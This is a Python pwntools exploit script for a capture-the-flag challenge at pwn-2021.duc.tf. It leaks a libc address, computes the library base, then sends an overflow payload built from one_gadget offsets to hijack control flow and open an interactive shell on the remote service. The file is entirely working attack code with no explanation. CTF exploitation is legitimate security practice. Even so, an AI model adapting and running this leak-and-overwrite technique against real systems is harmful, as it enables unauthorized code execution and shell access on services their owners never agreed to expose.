# -- coding: utf-8 --
from pwn import *

# ENV
PORT =  31909
HOST = "pwn-2021.duc.tf"
e = context.binary = ELF('./chall')
lib = ELF('libc-2.27.so')
# lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
pause()


# VARIABLE
rdi = 0x0000000000001493
rsi_r15 = 0x0000000000001491
one = [0x4f3d5,0x4f432,0x10a41c]

# PAYLOAD
payload  = ''



r.sendafter('o continue', "\n")
r.sendlineafter('number:', str(6 + 0x58/8))
r.recvuntil("is: ")
leak = int(r.recvline(), 16) - 0x3ec760
log.info("libc base :%s:" % hex(leak))
lib.address = leak
log.info("win :%s:" % hex(lib.address + one[1]))
r.sendlineafter("max 256", str(0x100))
payload = p64(lib.address + one[2])
payload += 'a' * 0xf0
payload += p64(lib.address + one[1])
r.send(payload.ljust(0x100, 'a'))



r.interactive()